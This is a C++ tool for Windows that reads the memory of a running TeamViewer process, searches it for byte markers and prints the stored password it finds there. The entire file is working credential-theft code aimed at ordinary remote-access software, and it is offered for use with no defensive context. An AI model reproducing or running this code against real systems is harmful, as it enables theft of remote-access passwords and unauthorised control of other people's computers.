/**
    @author Vahagn Vardanyan (@vah_13)
    @version 1.1 31/07/17 
*/
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <list>     
#include <iterator>
#include <algorithm>
#include <iomanip>
#include <stdio.h>
#include <ctype.h>
using namespace std;

int GetProcId(char* ProcName)
{
	PROCESSENTRY32   pe32;
	HANDLE         hSnapshot = NULL;
	pe32.dwSize = sizeof( PROCESSENTRY32 );
	hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if( Process32First( hSnapshot, &pe32 ) )
	{
		do{
			if( strcmp( pe32.szExeFile, ProcName ) == 0 )
				break;
		}while( Process32Next( hSnapshot, &pe32 ) );
	}
	if( hSnapshot != INVALID_HANDLE_VALUE )
		CloseHandle( hSnapshot );
	return pe32.th32ProcessID;
	
}

string intToHexString(int intValue) {
    string hexStr;
    std::stringstream sstream;
    sstream << "0x"
            << std::setfill ('0') << std::setw(2)
    << std::hex << (int)intValue;

    hexStr= sstream.str();
    sstream.clear();   

    return hexStr;
}
bool PromptForChar( const char* prompt, char& readch )
{
    std::string tmp;
    std::cout << prompt << std::endl;
    if (std::getline(std::cin, tmp))
    {
        if (tmp.length() == 1)
        {
            readch = tmp[0];
        }
        else
        {
            readch = '\0';
        }
        return true;
    }
    return false;
}

bool readMemory(DWORD pid, char* _p, size_t len)
{
	HANDLE process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if(process)
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);

        MEMORY_BASIC_INFORMATION info;
        std::vector<char> chunk;
        char* p = _p;
		VirtualQueryEx(process, p, &info, sizeof(info));
		chunk.resize(len);
		SIZE_T bytesRead;
		ReadProcessMemory(process, p, &chunk[0], len, &bytesRead);
		for (int i = 0;i<bytesRead;i+=2)
		{
			if (!isalnum(chunk[i]) 	&& 	!isprint(chunk[i]))
			{
					return false;
			}
		}

		cout<<"***********"<<endl<<intToHexString((int)(void*)p)<<endl<<"Password: ";		
		for (i = 0;i<bytesRead;i+=2)
		{
                cout<< chunk[i];	
		}
		cout <<endl;
		cout<<intToHexString((int)(void*)p)<<endl<<"***********"<<endl;
		
    }
	return true;
}

list<int> GetAddressOfData(DWORD pid, const char *data, size_t len)
{
	list<int> entries;
	int count = 0;
    HANDLE process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if(process)
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);

        MEMORY_BASIC_INFORMATION info;
        std::vector<char> chunk;
        char* p = 0;
        while(p < si.lpMaximumApplicationAddress)
        {
            if(VirtualQueryEx(process, p, &info, sizeof(info)) == sizeof(info))
            {
			  if (info.Type == MEM_PRIVATE && info.State == MEM_COMMIT)
			  {     
				    p = (char*)info.BaseAddress;
					chunk.resize(info.RegionSize);
					SIZE_T bytesRead;

					if(ReadProcessMemory(process, p, &chunk[0], info.RegionSize, &bytesRead))
					{

					   for(size_t i = 0; i < (bytesRead - len); ++i)
						{							
								if(memcmp(data, &chunk[i], len) == 0)
								{
									entries.push_back((int)(void*)(p+i));
									count ++;
								}
						}
					}
				}
                p += info.RegionSize;
            }

        }
    }
	cout << "count " <<  count << '\n';
    return entries;
}

void __main(bool flag)
{
		const char start_magic_data[] = "\x00\x88"; 
  		char _end_magic_data1[] = "\x00\x00\x00\x20\x00\x00\x00";
		char _end_magic_data2[] = "\x00\x00\x00\x00\x00\x00\x00";
		if (flag)
		{
			//*_end_magic_data1 = *_end_magic_data1;
		}
		else
		{
			//memcpy(_end_magic_data1, _end_magic_data2, sizeof(_end_magic_data2));
		}

		int PID = GetProcId("TeamViewer.exe");	
		std::cout << "Local data address: " << (void*)start_magic_data << "\n";
		list<int> start_address = GetAddressOfData(PID, start_magic_data, 2);	
		cout<<"start end magic search "<<'\n';	
		list<int> end_address = GetAddressOfData(PID, _end_magic_data1, (sizeof(_end_magic_data1)/sizeof(*_end_magic_data1))-1);
		int key = 0;
		int count = 0;
		
		start_address.reverse();
		end_address.reverse();

		for (std::list<int>::const_iterator iterator = start_address.begin(), end = start_address.end(); iterator != end; ++iterator) 
		{
			int i = *iterator;
						key = i;	
						for (int j=key;j<key+33;j++){
							std::list<int>::iterator it = std::find(end_address.begin(), end_address.end(), j);///////////////////// need use another search alg
							if ( it != end_address.end() )
							{
										if (readMemory(PID,(char*)(void*)(i+2),j-i-2))
										{	
											break;
										}
								}
						}
						//count++;
						//cout << count << endl;
		}

	cout<<count;
}
int main()
{
	
	__main(true);

	char type = '\0';
	while( PromptForChar( "Try 00x00x00x00x00x00x00 magic data (it can take a lot of time, try to run the code in python or try change search function (166-173 lines (: ? [y/n]", type ) )
		{
			if (type == 'y')
			{
					__main(false);			
			}
			if (type== 'n')
			{
					cout << ":-)";
					return 0;
			}
		}
    return 0;	


}
